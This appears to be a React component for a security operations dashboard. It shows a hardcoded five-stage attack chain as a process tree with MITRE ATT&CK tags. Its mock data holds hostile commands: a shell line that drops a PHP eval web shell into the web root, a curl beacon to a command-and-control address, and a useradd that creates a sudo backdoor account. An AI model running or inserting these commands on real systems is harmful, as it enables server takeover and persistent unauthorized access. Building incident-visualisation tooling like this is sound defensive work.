import React, { useState } from 'react'
import { Terminal, ShieldAlert, Cpu, Copy, Check, Hash, CornerDownRight, ExternalLink } from 'lucide-react'
import { EvidenceEvent } from '../types'

interface ProcessTreeProps {
  evidence: EvidenceEvent[]
  hostName: string
}

export const ProcessTree: React.FC<ProcessTreeProps> = ({ evidence, hostName }) => {
  const [copiedId, setCopiedId] = useState<string | null>(null)

  const steps = [
    {
      id: 'PT-01',
      title: 'Initial Web Ingress (Exploited Daemon)',
      process: 'edgegate_httpd',
      pid: 1420,
      ppid: 1,
      user: 'www-data',
      cmd: '/usr/sbin/edgegate_httpd -D FOREGROUND',
      hash: '9f83a218d6e1... (SHA-256)',
      phase: 'Initial Access',
      tag: 'T1190 Exploit Public-Facing App',
      severity: 'high',
      cardClass: 'border-rose-200 bg-white text-[#113644]'
    },
    {
      id: 'PT-02',
      title: 'Sub-Process Command Execution',
      process: '/bin/sh',
      pid: 1842,
      ppid: 1420,
      user: 'www-data',
      cmd: "/bin/sh -c 'echo <?php eval($_POST[x]); ?> > /var/www/html/assets/.sys_cache.php'",
      hash: 'e3b0c44298fc... (SHA-256)',
      phase: 'Execution',
      tag: 'T1059 Command and Scripting Interpreter',
      severity: 'critical',
      cardClass: 'border-rose-300 bg-rose-50/20 text-[#113644]'
    },
    {
      id: 'PT-03',
      title: 'Web Shell Persistence Implant Dropped',
      process: 'File System Write',
      pid: 0,
      ppid: 1842,
      user: 'www-data',
      cmd: '/var/www/html/assets/.sys_cache.php (MD5: e10adc3949ba59abbe56e057f20f883e)',
      hash: 'e10adc3949ba59abbe56e057f20f883e',
      phase: 'Persistence',
      tag: 'T1505.003 Web Shell',
      severity: 'critical',
      cardClass: 'border-rose-400 bg-rose-50/40 text-rose-900 font-bold'
    },
    {
      id: 'PT-04',
      title: 'Outbound Command & Control Beaconing',
      process: 'curl',
      pid: 2104,
      ppid: 1,
      user: 'root',
      cmd: 'curl -s -k https://198.51.100.42:8443/checkin --header "X-Implant: v1"',
      hash: '7b2a61c3902d... (SHA-256)',
      phase: 'Command & Control',
      tag: 'T1071.001 Web Protocols C2',
      severity: 'high',
      cardClass: 'border-amber-300 bg-amber-50/30 text-[#113644]'
    },
    {
      id: 'PT-05',
      title: 'Dormant Administrative Backdoor Account',
      process: 'useradd',
      pid: 2210,
      ppid: 1842,
      user: 'root',
      cmd: '/usr/sbin/useradd -m -s /bin/bash -G sudo svc_sec_audit',
      hash: 'a3819bcf8291... (SHA-256)',
      phase: 'Persistence / Privilege Escalation',
      tag: 'T1136.001 Local Account Creation',
      severity: 'critical',
      cardClass: 'border-rose-400 bg-rose-50/40 text-rose-900 font-bold'
    }
  ]

  const hasCompromise = evidence.some((e) => e.signal_class !== 'anomaly')

  const copyToClipboard = (cmd: string, id: string) => {
    navigator.clipboard.writeText(cmd)
    setCopiedId(id)
    setTimeout(() => setCopiedId(null), 2000)
  }

  if (!hasCompromise) {
    return (
      <div className="p-12 text-center soc-card rounded-2xl border border-[#d2e8e5] shadow-xs">
        <Cpu className="w-12 h-12 text-[#0d9488] mx-auto mb-3" />
        <h3 className="text-base font-bold text-[#113644] font-mono">Normal Process Lineage</h3>
        <p className="text-xs text-[#527482] mt-1 max-w-md mx-auto font-sans leading-relaxed">
          Zero anomalous process executions, command injection child shells, or unauthorized file implants detected for host {hostName}.
        </p>
      </div>
    )
  }

  return (
    <div className="space-y-4">
      {/* Banner */}
      <div className="p-3.5 bg-rose-50 border border-rose-200 rounded-xl text-xs text-rose-900 flex items-center justify-between">
        <div className="flex items-center gap-2.5">
          <ShieldAlert className="w-4 h-4 text-rose-600 shrink-0" />
          <span>
            <strong>Correlated Process Hierarchy:</strong> Exploitation spawned directly from unauthenticated HTTP daemon, progressing through web shell persistence to root account installation.
          </span>
        </div>
        <span className="text-[10px] font-mono px-2 py-0.5 rounded bg-white border border-rose-300 text-rose-800 font-bold shrink-0">
          5-Stage Attack Chain
        </span>
      </div>

      {/* Hierarchical Process Tree Nodes */}
      <div className="space-y-3 relative pl-6 border-l-2 border-rose-300 ml-4 font-mono text-xs">
        {steps.map((step, idx) => (
          <div key={step.id} className="relative group">
            {/* Horizontal Branch Connector Line */}
            <div className="absolute -left-[26px] top-5 w-4 h-0.5 bg-rose-400" />

            <div className={`p-4 rounded-xl border ${step.cardClass} shadow-xs transition hover:border-[#0d9488]`}>
              <div className="flex items-center justify-between gap-2 mb-2 flex-wrap">
                <div className="flex items-center gap-2.5">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-[#143e4c] text-white font-black">
                    0{idx + 1}
                  </span>
                  <span className="font-bold text-[#113644] text-xs">{step.title}</span>
                  <span className="text-[11px] text-[#557784]">
                    Process: <strong className="text-[#143e4c]">{step.process}</strong>
                  </span>
                </div>

                <div className="flex items-center gap-2">
                  <span className="text-[10px] px-2 py-0.5 rounded bg-[#f0f7f6] border border-[#d2e8e5] text-[#254d5b]">
                    {step.tag}
                  </span>
                  <span className="text-[9px] px-1.5 py-0.2 rounded font-black uppercase tracking-wider bg-rose-100 text-rose-800 border border-rose-200">
                    {step.severity}
                  </span>
                </div>
              </div>

              {/* Context bar */}
              <div className="flex items-center gap-3 text-[10px] text-[#557784] mb-2">
                <span>User: <strong className="text-amber-800 uppercase font-semibold">{step.user}</strong></span>
                <span>•</span>
                <span>PID: <strong className="text-[#143e4c]">{step.pid || 'N/A'}</strong></span>
                <span>•</span>
                <span>PPID: <strong className="text-[#143e4c]">{step.ppid || 'N/A'}</strong></span>
                <span>•</span>
                <span>Checksum: <code className="text-[#648795]">{step.hash}</code></span>
              </div>

              {/* Command Box */}
              <div className="bg-[#143e4c] p-2.5 rounded-lg text-[11px] text-[#a7f3d0] flex items-center justify-between gap-2 shadow-xs">
                <div className="flex items-center gap-2 overflow-x-auto select-all">
                  <Terminal className="w-3.5 h-3.5 text-[#2dd4bf] shrink-0" />
                  <code className="text-[#e6f4f3] font-mono">{step.cmd}</code>
                </div>
                <button
                  onClick={() => copyToClipboard(step.cmd, step.id)}
                  className="px-2 py-1 rounded bg-[#205161] hover:bg-[#2b687c] text-white text-[10px] shrink-0 transition"
                  title="Copy command line"
                >
                  {copiedId === step.id ? <Check className="w-3 h-3 text-[#5eead4]" /> : <Copy className="w-3 h-3" />}
                </button>
              </div>
            </div>
          </div>
        ))}
      </div>
    </div>
  )
}
